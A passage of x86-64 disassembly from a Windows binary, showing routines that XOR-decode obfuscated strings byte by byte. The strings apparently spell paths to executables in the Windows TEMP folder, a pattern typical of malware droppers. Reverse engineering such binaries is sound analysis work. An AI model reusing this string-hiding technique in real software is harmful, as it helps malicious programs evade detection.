   140001d93:	b8 06 00 00 00       	mov    $0x6,%eax
   140001d98:	4c 0f 47 05 58 e7 01 	cmova  0x1e758(%rip),%r8        # 0x1400204f8
   140001d9f:	00 
   140001da0:	33 d2                	xor    %edx,%edx
   140001da2:	48 f7 f1             	div    %rcx
   140001da5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001daa:	34 64                	xor    $0x64,%al
   140001dac:	41 88 40 06          	mov    %al,0x6(%r8)
   140001db0:	4c 8b c3             	mov    %rbx,%r8
   140001db3:	48 83 3d 55 e7 01 00 	cmpq   $0xf,0x1e755(%rip)        # 0x140020510
   140001dba:	0f 
   140001dbb:	b8 07 00 00 00       	mov    $0x7,%eax
   140001dc0:	4c 0f 47 05 30 e7 01 	cmova  0x1e730(%rip),%r8        # 0x1400204f8
   140001dc7:	00 
   140001dc8:	33 d2                	xor    %edx,%edx
   140001dca:	48 f7 f1             	div    %rcx
   140001dcd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001dd2:	34 6f                	xor    $0x6f,%al
   140001dd4:	41 88 40 07          	mov    %al,0x7(%r8)
   140001dd8:	4c 8b c3             	mov    %rbx,%r8
   140001ddb:	48 83 3d 2d e7 01 00 	cmpq   $0xf,0x1e72d(%rip)        # 0x140020510
   140001de2:	0f 
   140001de3:	b8 08 00 00 00       	mov    $0x8,%eax
   140001de8:	4c 0f 47 05 08 e7 01 	cmova  0x1e708(%rip),%r8        # 0x1400204f8
   140001def:	00 
   140001df0:	33 d2                	xor    %edx,%edx
   140001df2:	48 f7 f1             	div    %rcx
   140001df5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001dfa:	34 77                	xor    $0x77,%al
   140001dfc:	41 88 40 08          	mov    %al,0x8(%r8)
   140001e00:	4c 8b c3             	mov    %rbx,%r8
   140001e03:	48 83 3d 05 e7 01 00 	cmpq   $0xf,0x1e705(%rip)        # 0x140020510
   140001e0a:	0f 
   140001e0b:	b8 09 00 00 00       	mov    $0x9,%eax
   140001e10:	4c 0f 47 05 e0 e6 01 	cmova  0x1e6e0(%rip),%r8        # 0x1400204f8
   140001e17:	00 
   140001e18:	33 d2                	xor    %edx,%edx
   140001e1a:	48 f7 f1             	div    %rcx
   140001e1d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e22:	34 73                	xor    $0x73,%al
   140001e24:	41 88 40 09          	mov    %al,0x9(%r8)
   140001e28:	4c 8b c3             	mov    %rbx,%r8
   140001e2b:	48 83 3d dd e6 01 00 	cmpq   $0xf,0x1e6dd(%rip)        # 0x140020510
   140001e32:	0f 
   140001e33:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001e38:	4c 0f 47 05 b8 e6 01 	cmova  0x1e6b8(%rip),%r8        # 0x1400204f8
   140001e3f:	00 
   140001e40:	33 d2                	xor    %edx,%edx
   140001e42:	48 f7 f1             	div    %rcx
   140001e45:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e4a:	34 5c                	xor    $0x5c,%al
   140001e4c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140001e50:	4c 8b c3             	mov    %rbx,%r8
   140001e53:	48 83 3d b5 e6 01 00 	cmpq   $0xf,0x1e6b5(%rip)        # 0x140020510
   140001e5a:	0f 
   140001e5b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140001e60:	4c 0f 47 05 90 e6 01 	cmova  0x1e690(%rip),%r8        # 0x1400204f8
   140001e67:	00 
   140001e68:	33 d2                	xor    %edx,%edx
   140001e6a:	48 f7 f1             	div    %rcx
   140001e6d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e72:	34 54                	xor    $0x54,%al
   140001e74:	41 88 40 0b          	mov    %al,0xb(%r8)
   140001e78:	4c 8b c3             	mov    %rbx,%r8
   140001e7b:	48 83 3d 8d e6 01 00 	cmpq   $0xf,0x1e68d(%rip)        # 0x140020510
   140001e82:	0f 
   140001e83:	b8 0c 00 00 00       	mov    $0xc,%eax
   140001e88:	4c 0f 47 05 68 e6 01 	cmova  0x1e668(%rip),%r8        # 0x1400204f8
   140001e8f:	00 
   140001e90:	33 d2                	xor    %edx,%edx
   140001e92:	48 f7 f1             	div    %rcx
   140001e95:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001e9a:	34 45                	xor    $0x45,%al
   140001e9c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140001ea0:	4c 8b c3             	mov    %rbx,%r8
   140001ea3:	48 83 3d 65 e6 01 00 	cmpq   $0xf,0x1e665(%rip)        # 0x140020510
   140001eaa:	0f 
   140001eab:	b8 0d 00 00 00       	mov    $0xd,%eax
   140001eb0:	4c 0f 47 05 40 e6 01 	cmova  0x1e640(%rip),%r8        # 0x1400204f8
   140001eb7:	00 
   140001eb8:	33 d2                	xor    %edx,%edx
   140001eba:	48 f7 f1             	div    %rcx
   140001ebd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001ec2:	34 4d                	xor    $0x4d,%al
   140001ec4:	41 88 40 0d          	mov    %al,0xd(%r8)
   140001ec8:	4c 8b c3             	mov    %rbx,%r8
   140001ecb:	48 83 3d 3d e6 01 00 	cmpq   $0xf,0x1e63d(%rip)        # 0x140020510
   140001ed2:	0f 
   140001ed3:	b8 0e 00 00 00       	mov    $0xe,%eax
   140001ed8:	4c 0f 47 05 18 e6 01 	cmova  0x1e618(%rip),%r8        # 0x1400204f8
   140001edf:	00 
   140001ee0:	33 d2                	xor    %edx,%edx
   140001ee2:	48 f7 f1             	div    %rcx
   140001ee5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001eea:	34 50                	xor    $0x50,%al
   140001eec:	41 88 40 0e          	mov    %al,0xe(%r8)
   140001ef0:	4c 8b c3             	mov    %rbx,%r8
   140001ef3:	48 83 3d 15 e6 01 00 	cmpq   $0xf,0x1e615(%rip)        # 0x140020510
   140001efa:	0f 
   140001efb:	b8 0f 00 00 00       	mov    $0xf,%eax
   140001f00:	4c 0f 47 05 f0 e5 01 	cmova  0x1e5f0(%rip),%r8        # 0x1400204f8
   140001f07:	00 
   140001f08:	33 d2                	xor    %edx,%edx
   140001f0a:	48 f7 f1             	div    %rcx
   140001f0d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f12:	34 5c                	xor    $0x5c,%al
   140001f14:	41 88 40 0f          	mov    %al,0xf(%r8)
   140001f18:	4c 8b c3             	mov    %rbx,%r8
   140001f1b:	48 83 3d ed e5 01 00 	cmpq   $0xf,0x1e5ed(%rip)        # 0x140020510
   140001f22:	0f 
   140001f23:	b8 10 00 00 00       	mov    $0x10,%eax
   140001f28:	4c 0f 47 05 c8 e5 01 	cmova  0x1e5c8(%rip),%r8        # 0x1400204f8
   140001f2f:	00 
   140001f30:	33 d2                	xor    %edx,%edx
   140001f32:	48 f7 f1             	div    %rcx
   140001f35:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f3a:	34 67                	xor    $0x67,%al
   140001f3c:	41 88 40 10          	mov    %al,0x10(%r8)
   140001f40:	4c 8b c3             	mov    %rbx,%r8
   140001f43:	48 83 3d c5 e5 01 00 	cmpq   $0xf,0x1e5c5(%rip)        # 0x140020510
   140001f4a:	0f 
   140001f4b:	b8 11 00 00 00       	mov    $0x11,%eax
   140001f50:	4c 0f 47 05 a0 e5 01 	cmova  0x1e5a0(%rip),%r8        # 0x1400204f8
   140001f57:	00 
   140001f58:	33 d2                	xor    %edx,%edx
   140001f5a:	48 f7 f1             	div    %rcx
   140001f5d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f62:	34 69                	xor    $0x69,%al
   140001f64:	41 88 40 11          	mov    %al,0x11(%r8)
   140001f68:	4c 8b c3             	mov    %rbx,%r8
   140001f6b:	48 83 3d 9d e5 01 00 	cmpq   $0xf,0x1e59d(%rip)        # 0x140020510
   140001f72:	0f 
   140001f73:	b8 12 00 00 00       	mov    $0x12,%eax
   140001f78:	4c 0f 47 05 78 e5 01 	cmova  0x1e578(%rip),%r8        # 0x1400204f8
   140001f7f:	00 
   140001f80:	33 d2                	xor    %edx,%edx
   140001f82:	48 f7 f1             	div    %rcx
   140001f85:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001f8a:	34 61                	xor    $0x61,%al
   140001f8c:	41 88 40 12          	mov    %al,0x12(%r8)
   140001f90:	4c 8b c3             	mov    %rbx,%r8
   140001f93:	48 83 3d 75 e5 01 00 	cmpq   $0xf,0x1e575(%rip)        # 0x140020510
   140001f9a:	0f 
   140001f9b:	b8 13 00 00 00       	mov    $0x13,%eax
   140001fa0:	4c 0f 47 05 50 e5 01 	cmova  0x1e550(%rip),%r8        # 0x1400204f8
   140001fa7:	00 
   140001fa8:	33 d2                	xor    %edx,%edx
   140001faa:	48 f7 f1             	div    %rcx
   140001fad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001fb2:	34 6e                	xor    $0x6e,%al
   140001fb4:	41 88 40 13          	mov    %al,0x13(%r8)
   140001fb8:	4c 8b c3             	mov    %rbx,%r8
   140001fbb:	48 83 3d 4d e5 01 00 	cmpq   $0xf,0x1e54d(%rip)        # 0x140020510
   140001fc2:	0f 
   140001fc3:	b8 14 00 00 00       	mov    $0x14,%eax
   140001fc8:	4c 0f 47 05 28 e5 01 	cmova  0x1e528(%rip),%r8        # 0x1400204f8
   140001fcf:	00 
   140001fd0:	33 d2                	xor    %edx,%edx
   140001fd2:	48 f7 f1             	div    %rcx
   140001fd5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140001fda:	34 6e                	xor    $0x6e,%al
   140001fdc:	41 88 40 14          	mov    %al,0x14(%r8)
   140001fe0:	4c 8b c3             	mov    %rbx,%r8
   140001fe3:	48 83 3d 25 e5 01 00 	cmpq   $0xf,0x1e525(%rip)        # 0x140020510
   140001fea:	0f 
   140001feb:	b8 15 00 00 00       	mov    $0x15,%eax
   140001ff0:	4c 0f 47 05 00 e5 01 	cmova  0x1e500(%rip),%r8        # 0x1400204f8
   140001ff7:	00 
   140001ff8:	33 d2                	xor    %edx,%edx
   140001ffa:	48 f7 f1             	div    %rcx
   140001ffd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002002:	34 69                	xor    $0x69,%al
   140002004:	41 88 40 15          	mov    %al,0x15(%r8)
   140002008:	4c 8b c3             	mov    %rbx,%r8
   14000200b:	48 83 3d fd e4 01 00 	cmpq   $0xf,0x1e4fd(%rip)        # 0x140020510
   140002012:	0f 
   140002013:	b8 16 00 00 00       	mov    $0x16,%eax
   140002018:	4c 0f 47 05 d8 e4 01 	cmova  0x1e4d8(%rip),%r8        # 0x1400204f8
   14000201f:	00 
   140002020:	33 d2                	xor    %edx,%edx
   140002022:	48 f7 f1             	div    %rcx
   140002025:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000202a:	34 31                	xor    $0x31,%al
   14000202c:	41 88 40 16          	mov    %al,0x16(%r8)
   140002030:	4c 8b c3             	mov    %rbx,%r8
   140002033:	48 83 3d d5 e4 01 00 	cmpq   $0xf,0x1e4d5(%rip)        # 0x140020510
   14000203a:	0f 
   14000203b:	b8 17 00 00 00       	mov    $0x17,%eax
   140002040:	4c 0f 47 05 b0 e4 01 	cmova  0x1e4b0(%rip),%r8        # 0x1400204f8
   140002047:	00 
   140002048:	33 d2                	xor    %edx,%edx
   14000204a:	48 f7 f1             	div    %rcx
   14000204d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002052:	34 2e                	xor    $0x2e,%al
   140002054:	41 88 40 17          	mov    %al,0x17(%r8)
   140002058:	4c 8b c3             	mov    %rbx,%r8
   14000205b:	48 83 3d ad e4 01 00 	cmpq   $0xf,0x1e4ad(%rip)        # 0x140020510
   140002062:	0f 
   140002063:	b8 18 00 00 00       	mov    $0x18,%eax
   140002068:	4c 0f 47 05 88 e4 01 	cmova  0x1e488(%rip),%r8        # 0x1400204f8
   14000206f:	00 
   140002070:	33 d2                	xor    %edx,%edx
   140002072:	48 f7 f1             	div    %rcx
   140002075:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000207a:	34 65                	xor    $0x65,%al
   14000207c:	41 88 40 18          	mov    %al,0x18(%r8)
   140002080:	4c 8b c3             	mov    %rbx,%r8
   140002083:	48 83 3d 85 e4 01 00 	cmpq   $0xf,0x1e485(%rip)        # 0x140020510
   14000208a:	0f 
   14000208b:	b8 19 00 00 00       	mov    $0x19,%eax
   140002090:	4c 0f 47 05 60 e4 01 	cmova  0x1e460(%rip),%r8        # 0x1400204f8
   140002097:	00 
   140002098:	33 d2                	xor    %edx,%edx
   14000209a:	48 f7 f1             	div    %rcx
   14000209d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400020a2:	34 78                	xor    $0x78,%al
   1400020a4:	41 88 40 19          	mov    %al,0x19(%r8)
   1400020a8:	4c 8b c3             	mov    %rbx,%r8
   1400020ab:	48 83 3d 5d e4 01 00 	cmpq   $0xf,0x1e45d(%rip)        # 0x140020510
   1400020b2:	0f 
   1400020b3:	b8 1a 00 00 00       	mov    $0x1a,%eax
   1400020b8:	4c 0f 47 05 38 e4 01 	cmova  0x1e438(%rip),%r8        # 0x1400204f8
   1400020bf:	00 
   1400020c0:	33 d2                	xor    %edx,%edx
   1400020c2:	48 f7 f1             	div    %rcx
   1400020c5:	48 8b c3             	mov    %rbx,%rax
   1400020c8:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   1400020cd:	80 f1 65             	xor    $0x65,%cl
   1400020d0:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   1400020d4:	48 83 c4 30          	add    $0x30,%rsp
   1400020d8:	5b                   	pop    %rbx
   1400020d9:	c3                   	ret
   1400020da:	cc                   	int3
   1400020db:	cc                   	int3
   1400020dc:	cc                   	int3
   1400020dd:	cc                   	int3
   1400020de:	cc                   	int3
   1400020df:	cc                   	int3
   1400020e0:	40 53                	rex push %rbx
   1400020e2:	48 83 ec 30          	sub    $0x30,%rsp
   1400020e6:	48 8d 1d eb e4 01 00 	lea    0x1e4eb(%rip),%rbx        # 0x1400205d8
   1400020ed:	ba 1b 00 00 00       	mov    $0x1b,%edx
   1400020f2:	48 8b cb             	mov    %rbx,%rcx
   1400020f5:	e8 66 43 00 00       	call   0x140006460
   1400020fa:	4c 8d 0d e7 c7 00 00 	lea    0xc7e7(%rip),%r9        # 0x14000e8e8
   140002101:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140002108:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000210f:	00 
   140002110:	48 ff c1             	inc    %rcx
   140002113:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   140002118:	75 f6                	jne    0x140002110
   14000211a:	48 83 3d ce e4 01 00 	cmpq   $0xf,0x1e4ce(%rip)        # 0x1400205f0
   140002121:	0f 
   140002122:	48 8b c3             	mov    %rbx,%rax
   140002125:	4c 8b c3             	mov    %rbx,%r8
   140002128:	48 0f 47 05 a8 e4 01 	cmova  0x1e4a8(%rip),%rax        # 0x1400205d8
   14000212f:	00 
   140002130:	c6 00 25             	movb   $0x25,(%rax)
   140002133:	b8 01 00 00 00       	mov    $0x1,%eax
   140002138:	48 83 3d b0 e4 01 00 	cmpq   $0xf,0x1e4b0(%rip)        # 0x1400205f0
   14000213f:	0f 
   140002140:	4c 0f 47 05 90 e4 01 	cmova  0x1e490(%rip),%r8        # 0x1400205d8
   140002147:	00 
   140002148:	33 d2                	xor    %edx,%edx
   14000214a:	48 f7 f1             	div    %rcx
   14000214d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002152:	34 3a                	xor    $0x3a,%al
   140002154:	41 88 40 01          	mov    %al,0x1(%r8)
   140002158:	4c 8b c3             	mov    %rbx,%r8
   14000215b:	48 83 3d 8d e4 01 00 	cmpq   $0xf,0x1e48d(%rip)        # 0x1400205f0
   140002162:	0f 
   140002163:	b8 02 00 00 00       	mov    $0x2,%eax
   140002168:	4c 0f 47 05 68 e4 01 	cmova  0x1e468(%rip),%r8        # 0x1400205d8
   14000216f:	00 
   140002170:	33 d2                	xor    %edx,%edx
   140002172:	48 f7 f1             	div    %rcx
   140002175:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000217a:	34 5c                	xor    $0x5c,%al
   14000217c:	41 88 40 02          	mov    %al,0x2(%r8)
   140002180:	4c 8b c3             	mov    %rbx,%r8
   140002183:	48 83 3d 65 e4 01 00 	cmpq   $0xf,0x1e465(%rip)        # 0x1400205f0
   14000218a:	0f 
   14000218b:	b8 03 00 00 00       	mov    $0x3,%eax
   140002190:	4c 0f 47 05 40 e4 01 	cmova  0x1e440(%rip),%r8        # 0x1400205d8
   140002197:	00 
   140002198:	33 d2                	xor    %edx,%edx
   14000219a:	48 f7 f1             	div    %rcx
   14000219d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400021a2:	34 57                	xor    $0x57,%al
   1400021a4:	41 88 40 03          	mov    %al,0x3(%r8)
   1400021a8:	4c 8b c3             	mov    %rbx,%r8
   1400021ab:	48 83 3d 3d e4 01 00 	cmpq   $0xf,0x1e43d(%rip)        # 0x1400205f0
   1400021b2:	0f 
   1400021b3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400021b8:	4c 0f 47 05 18 e4 01 	cmova  0x1e418(%rip),%r8        # 0x1400205d8
   1400021bf:	00 
   1400021c0:	33 d2                	xor    %edx,%edx
   1400021c2:	48 f7 f1             	div    %rcx
   1400021c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400021ca:	34 69                	xor    $0x69,%al
   1400021cc:	41 88 40 04          	mov    %al,0x4(%r8)
   1400021d0:	4c 8b c3             	mov    %rbx,%r8
   1400021d3:	48 83 3d 15 e4 01 00 	cmpq   $0xf,0x1e415(%rip)        # 0x1400205f0
   1400021da:	0f 
   1400021db:	b8 05 00 00 00       	mov    $0x5,%eax
   1400021e0:	4c 0f 47 05 f0 e3 01 	cmova  0x1e3f0(%rip),%r8        # 0x1400205d8
   1400021e7:	00 
   1400021e8:	33 d2                	xor    %edx,%edx
   1400021ea:	48 f7 f1             	div    %rcx
   1400021ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400021f2:	34 6e                	xor    $0x6e,%al
   1400021f4:	41 88 40 05          	mov    %al,0x5(%r8)
   1400021f8:	4c 8b c3             	mov    %rbx,%r8
   1400021fb:	48 83 3d ed e3 01 00 	cmpq   $0xf,0x1e3ed(%rip)        # 0x1400205f0
   140002202:	0f 
   140002203:	b8 06 00 00 00       	mov    $0x6,%eax
   140002208:	4c 0f 47 05 c8 e3 01 	cmova  0x1e3c8(%rip),%r8        # 0x1400205d8
   14000220f:	00 
   140002210:	33 d2                	xor    %edx,%edx
   140002212:	48 f7 f1             	div    %rcx
   140002215:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000221a:	34 64                	xor    $0x64,%al
   14000221c:	41 88 40 06          	mov    %al,0x6(%r8)
   140002220:	4c 8b c3             	mov    %rbx,%r8
   140002223:	48 83 3d c5 e3 01 00 	cmpq   $0xf,0x1e3c5(%rip)        # 0x1400205f0
   14000222a:	0f 
   14000222b:	b8 07 00 00 00       	mov    $0x7,%eax
   140002230:	4c 0f 47 05 a0 e3 01 	cmova  0x1e3a0(%rip),%r8        # 0x1400205d8
   140002237:	00 
   140002238:	33 d2                	xor    %edx,%edx
   14000223a:	48 f7 f1             	div    %rcx
   14000223d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002242:	34 6f                	xor    $0x6f,%al
   140002244:	41 88 40 07          	mov    %al,0x7(%r8)
   140002248:	4c 8b c3             	mov    %rbx,%r8
   14000224b:	48 83 3d 9d e3 01 00 	cmpq   $0xf,0x1e39d(%rip)        # 0x1400205f0
   140002252:	0f 
   140002253:	b8 08 00 00 00       	mov    $0x8,%eax
   140002258:	4c 0f 47 05 78 e3 01 	cmova  0x1e378(%rip),%r8        # 0x1400205d8
   14000225f:	00 
   140002260:	33 d2                	xor    %edx,%edx
   140002262:	48 f7 f1             	div    %rcx
   140002265:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000226a:	34 77                	xor    $0x77,%al
   14000226c:	41 88 40 08          	mov    %al,0x8(%r8)
   140002270:	4c 8b c3             	mov    %rbx,%r8
   140002273:	48 83 3d 75 e3 01 00 	cmpq   $0xf,0x1e375(%rip)        # 0x1400205f0
   14000227a:	0f 
   14000227b:	b8 09 00 00 00       	mov    $0x9,%eax
   140002280:	4c 0f 47 05 50 e3 01 	cmova  0x1e350(%rip),%r8        # 0x1400205d8
   140002287:	00 
   140002288:	33 d2                	xor    %edx,%edx
   14000228a:	48 f7 f1             	div    %rcx
   14000228d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002292:	34 73                	xor    $0x73,%al
   140002294:	41 88 40 09          	mov    %al,0x9(%r8)
   140002298:	4c 8b c3             	mov    %rbx,%r8
   14000229b:	48 83 3d 4d e3 01 00 	cmpq   $0xf,0x1e34d(%rip)        # 0x1400205f0
   1400022a2:	0f 
   1400022a3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400022a8:	4c 0f 47 05 28 e3 01 	cmova  0x1e328(%rip),%r8        # 0x1400205d8
   1400022af:	00 
   1400022b0:	33 d2                	xor    %edx,%edx
   1400022b2:	48 f7 f1             	div    %rcx
   1400022b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400022ba:	34 5c                	xor    $0x5c,%al
   1400022bc:	41 88 40 0a          	mov    %al,0xa(%r8)
   1400022c0:	4c 8b c3             	mov    %rbx,%r8
   1400022c3:	48 83 3d 25 e3 01 00 	cmpq   $0xf,0x1e325(%rip)        # 0x1400205f0
   1400022ca:	0f 
   1400022cb:	b8 0b 00 00 00       	mov    $0xb,%eax
   1400022d0:	4c 0f 47 05 00 e3 01 	cmova  0x1e300(%rip),%r8        # 0x1400205d8
   1400022d7:	00 
   1400022d8:	33 d2                	xor    %edx,%edx
   1400022da:	48 f7 f1             	div    %rcx
   1400022dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400022e2:	34 54                	xor    $0x54,%al
   1400022e4:	41 88 40 0b          	mov    %al,0xb(%r8)
   1400022e8:	4c 8b c3             	mov    %rbx,%r8
   1400022eb:	48 83 3d fd e2 01 00 	cmpq   $0xf,0x1e2fd(%rip)        # 0x1400205f0
   1400022f2:	0f 
   1400022f3:	b8 0c 00 00 00       	mov    $0xc,%eax
   1400022f8:	4c 0f 47 05 d8 e2 01 	cmova  0x1e2d8(%rip),%r8        # 0x1400205d8
   1400022ff:	00 
   140002300:	33 d2                	xor    %edx,%edx
   140002302:	48 f7 f1             	div    %rcx
   140002305:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000230a:	34 45                	xor    $0x45,%al
   14000230c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140002310:	4c 8b c3             	mov    %rbx,%r8
   140002313:	48 83 3d d5 e2 01 00 	cmpq   $0xf,0x1e2d5(%rip)        # 0x1400205f0
   14000231a:	0f 
   14000231b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140002320:	4c 0f 47 05 b0 e2 01 	cmova  0x1e2b0(%rip),%r8        # 0x1400205d8
   140002327:	00 
   140002328:	33 d2                	xor    %edx,%edx
   14000232a:	48 f7 f1             	div    %rcx
   14000232d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002332:	34 4d                	xor    $0x4d,%al
   140002334:	41 88 40 0d          	mov    %al,0xd(%r8)
   140002338:	4c 8b c3             	mov    %rbx,%r8
   14000233b:	48 83 3d ad e2 01 00 	cmpq   $0xf,0x1e2ad(%rip)        # 0x1400205f0
   140002342:	0f 
   140002343:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002348:	4c 0f 47 05 88 e2 01 	cmova  0x1e288(%rip),%r8        # 0x1400205d8
   14000234f:	00 
   140002350:	33 d2                	xor    %edx,%edx
   140002352:	48 f7 f1             	div    %rcx
   140002355:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000235a:	34 50                	xor    $0x50,%al
   14000235c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140002360:	4c 8b c3             	mov    %rbx,%r8
   140002363:	48 83 3d 85 e2 01 00 	cmpq   $0xf,0x1e285(%rip)        # 0x1400205f0
   14000236a:	0f 
   14000236b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002370:	4c 0f 47 05 60 e2 01 	cmova  0x1e260(%rip),%r8        # 0x1400205d8
   140002377:	00 
   140002378:	33 d2                	xor    %edx,%edx
   14000237a:	48 f7 f1             	div    %rcx
   14000237d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002382:	34 5c                	xor    $0x5c,%al
   140002384:	41 88 40 0f          	mov    %al,0xf(%r8)
   140002388:	4c 8b c3             	mov    %rbx,%r8
   14000238b:	48 83 3d 5d e2 01 00 	cmpq   $0xf,0x1e25d(%rip)        # 0x1400205f0
   140002392:	0f 
   140002393:	b8 10 00 00 00       	mov    $0x10,%eax
   140002398:	4c 0f 47 05 38 e2 01 	cmova  0x1e238(%rip),%r8        # 0x1400205d8
   14000239f:	00 
   1400023a0:	33 d2                	xor    %edx,%edx
   1400023a2:	48 f7 f1             	div    %rcx
   1400023a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400023aa:	34 67                	xor    $0x67,%al
   1400023ac:	41 88 40 10          	mov    %al,0x10(%r8)
   1400023b0:	4c 8b c3             	mov    %rbx,%r8
   1400023b3:	48 83 3d 35 e2 01 00 	cmpq   $0xf,0x1e235(%rip)        # 0x1400205f0
   1400023ba:	0f 
   1400023bb:	b8 11 00 00 00       	mov    $0x11,%eax
   1400023c0:	4c 0f 47 05 10 e2 01 	cmova  0x1e210(%rip),%r8        # 0x1400205d8
   1400023c7:	00 
   1400023c8:	33 d2                	xor    %edx,%edx
   1400023ca:	48 f7 f1             	div    %rcx
   1400023cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400023d2:	34 69                	xor    $0x69,%al
   1400023d4:	41 88 40 11          	mov    %al,0x11(%r8)
   1400023d8:	4c 8b c3             	mov    %rbx,%r8
   1400023db:	48 83 3d 0d e2 01 00 	cmpq   $0xf,0x1e20d(%rip)        # 0x1400205f0
   1400023e2:	0f 
   1400023e3:	b8 12 00 00 00       	mov    $0x12,%eax
   1400023e8:	4c 0f 47 05 e8 e1 01 	cmova  0x1e1e8(%rip),%r8        # 0x1400205d8
   1400023ef:	00 
   1400023f0:	33 d2                	xor    %edx,%edx
   1400023f2:	48 f7 f1             	div    %rcx
   1400023f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400023fa:	34 61                	xor    $0x61,%al
   1400023fc:	41 88 40 12          	mov    %al,0x12(%r8)
   140002400:	4c 8b c3             	mov    %rbx,%r8
   140002403:	48 83 3d e5 e1 01 00 	cmpq   $0xf,0x1e1e5(%rip)        # 0x1400205f0
   14000240a:	0f 
   14000240b:	b8 13 00 00 00       	mov    $0x13,%eax
   140002410:	4c 0f 47 05 c0 e1 01 	cmova  0x1e1c0(%rip),%r8        # 0x1400205d8
   140002417:	00 
   140002418:	33 d2                	xor    %edx,%edx
   14000241a:	48 f7 f1             	div    %rcx
   14000241d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002422:	34 6e                	xor    $0x6e,%al
   140002424:	41 88 40 13          	mov    %al,0x13(%r8)
   140002428:	4c 8b c3             	mov    %rbx,%r8
   14000242b:	48 83 3d bd e1 01 00 	cmpq   $0xf,0x1e1bd(%rip)        # 0x1400205f0
   140002432:	0f 
   140002433:	b8 14 00 00 00       	mov    $0x14,%eax
   140002438:	4c 0f 47 05 98 e1 01 	cmova  0x1e198(%rip),%r8        # 0x1400205d8
   14000243f:	00 
   140002440:	33 d2                	xor    %edx,%edx
   140002442:	48 f7 f1             	div    %rcx
   140002445:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000244a:	34 6e                	xor    $0x6e,%al
   14000244c:	41 88 40 14          	mov    %al,0x14(%r8)
   140002450:	4c 8b c3             	mov    %rbx,%r8
   140002453:	48 83 3d 95 e1 01 00 	cmpq   $0xf,0x1e195(%rip)        # 0x1400205f0
   14000245a:	0f 
   14000245b:	b8 15 00 00 00       	mov    $0x15,%eax
   140002460:	4c 0f 47 05 70 e1 01 	cmova  0x1e170(%rip),%r8        # 0x1400205d8
   140002467:	00 
   140002468:	33 d2                	xor    %edx,%edx
   14000246a:	48 f7 f1             	div    %rcx
   14000246d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002472:	34 69                	xor    $0x69,%al
   140002474:	41 88 40 15          	mov    %al,0x15(%r8)
   140002478:	4c 8b c3             	mov    %rbx,%r8
   14000247b:	48 83 3d 6d e1 01 00 	cmpq   $0xf,0x1e16d(%rip)        # 0x1400205f0
   140002482:	0f 
   140002483:	b8 16 00 00 00       	mov    $0x16,%eax
   140002488:	4c 0f 47 05 48 e1 01 	cmova  0x1e148(%rip),%r8        # 0x1400205d8
   14000248f:	00 
   140002490:	33 d2                	xor    %edx,%edx
   140002492:	48 f7 f1             	div    %rcx
   140002495:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000249a:	34 32                	xor    $0x32,%al
